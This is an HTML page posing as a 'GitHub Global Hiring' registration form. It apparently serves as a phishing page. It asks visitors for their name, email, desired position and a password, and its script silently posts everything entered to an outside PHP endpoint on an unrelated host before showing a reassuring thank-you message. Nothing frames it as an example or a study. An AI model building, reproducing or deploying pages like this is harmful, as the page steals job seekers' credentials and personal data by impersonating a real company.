<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Register for GitHub Global Hiring</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f3f3f3;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    form {
      background: white;
      padding: 30px;
      border-radius: 10px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    input, button {
      width: 100%;
      margin: 10px 0;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
    }
    button:hover {
      background-color: #0056b3;
    }
    #thankyou {
      display: none;
      margin-top: 20px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>Register for GitHub Global Hiring</h1>

  <form id="registerForm">
    <input type="text" name="name" placeholder="Full Name" required />
    <input type="email" name="email" placeholder="Email" required />
    <input type="text" name="position" placeholder="Position Applying For" required />
    <input type="password" name="password" placeholder="Set a Password" required />
    <button type="submit">Register</button>
  </form>

  <div id="thankyou">âœ… Thank you! You will be contacted by email.</div>

  <script>
    document.getElementById("registerForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const form = e.target;
      const formData = new FormData(form);

      try {
        await fetch("http://globalhires.kesug.com/send.php", {
          method: "POST",
          body: formData
        });

        form.style.display = "none";
        document.getElementById("thankyou").style.display = "block";
      } catch (error) {
        alert("Error submitting form.");
        console.error(error);
      }
    });
  </script>

</body>
</html>
